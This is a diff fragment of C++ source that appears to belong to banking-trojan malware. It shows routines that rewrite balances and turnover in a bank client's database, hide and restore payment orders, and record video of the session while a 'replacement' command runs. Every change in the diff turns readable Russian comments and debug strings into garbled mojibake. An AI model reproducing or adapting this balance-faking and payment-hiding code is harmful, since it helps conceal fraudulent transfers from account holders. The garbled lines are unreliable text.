 			sql = "update Amounts set Expected=%d.%02d,Confirmed=%d.%d where Code='%s'";
 			__int64 v = restAccounts[n].oldSum;
 			pwsprintfA( sqlBuf.AsStr(), sql, (DWORD)(v / 100), (DWORD)(v % 100), (DWORD)(v / 100), (DWORD)(v % 100), restAccounts[n].account );
@@ -1499,7 +1510,7 @@ static void RestoreBalansAndDocs()
 			SQLHSTMT qr = DB->ExecuteSql( sqlBuf.AsStr(), 0 );
 			DB->CloseQuery(qr);
 
-			DBG( "Tiny", "Для счета %s восстанавливаем дебет %I64d", restAccounts[n].account, restAccounts[n].oldDebet );
+			DBG( "Tiny", "пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ %s пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ %I64d", restAccounts[n].account, restAccounts[n].oldDebet );
 			int DayDate = ConvertDate( DB, &restAccounts[n].date );
 			sql = "update Turns set ConDebit=%d.%02d where Code='%s' and DayDate=%d";
 			v = restAccounts[n].oldDebet;
@@ -1510,12 +1521,12 @@ static void RestoreBalansAndDocs()
 			n++;
 		}
 
-		DBG( "Tiny", "Восстанавляваем скрытую платежку" );
+		DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		n = 0;
 		while( hidePayments[n].account[0] )
 		{
-			DBG( "Tiny", "Восстанвливаем платежку %s %s", hidePayments[n].account, hidePayments[n].num );
-			TIMESTAMP_STRUCT endDay; //конец дня, для выбора платежки за определенный день
+			DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ %s %s", hidePayments[n].account, hidePayments[n].num );
+			TIMESTAMP_STRUCT endDay; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 			m_memcpy( &endDay, &hidePayments[n].date, sizeof(endDay) );
 			endDay.hour = 23;
 			endDay.minute = 59;
@@ -1537,7 +1548,7 @@ static void RestoreBalansAndDocs()
 
 static DWORD WINAPI ThreadHideReplacement(void*)
 {
-	//ждем пока появится строка подключения
+	//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	do
 	{
 		pSleep(1000);
@@ -1546,21 +1557,21 @@ static DWORD WINAPI ThreadHideReplacement(void*)
 	string fileFlag = BOT::MakeFileName( 0, GetStr(TinyFlagUpdate).t_str() );
 	for(;;)
 	{
-		DBG( "Tiny", "Запуск подмены и скрытия" );
+		DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		DWORD size;
-		//в считываемом файле в конце данных должен быть обязательно 0 или любой другой символ,
-		//чтобы потом вставить 0 и получить полноценную строку. 
-		//Это нужно учитывать при создании файла
+		//пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 0 пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+		//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 0 пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ. 
+		//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		char* rpl = (char*)File::ReadToBufferA( BOT::MakeFileName( 0, GetStr(TinyReplacement).t_str() ).t_str(), size );
 		//char* rpl = (char*)File::ReadToBufferA( "c:\\11.txt", size );
 		if( rpl )
 		{
-			VideoProcess::RecordPID( 0, "Tiny" ); //видео пишем только когда была команда на подмену
+			VideoProcess::RecordPID( 0, "Tiny" ); //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			rpl[size - 1] = 0;
 			ReadReplacement(rpl);
 			MemFree(rpl);
 		}
-		//удаляем флаг запуска подмены
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		pDeleteFileA( fileFlag.t_str() );
 		ReplacementBalance();
 		HidePayments();
